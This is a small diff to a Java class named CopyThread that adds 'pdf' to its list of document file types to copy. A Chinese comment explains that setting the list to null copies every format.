@@ -7,7 +7,7 @@ public class CopyThread extends Thread {
 
 	// 设置要复制的文件类型，如果要复制所有格式的文件，将fileTypes设为null即可
 
-	private static String[] fileTypes = { "ppt", "doc", "txt", "wps", "pptx", "docx" };
+	private static String[] fileTypes = { "ppt", "doc", "txt", "wps", "pptx", "docx", "pdf" };
 
 	// private static String[] fileTypes = null;
 
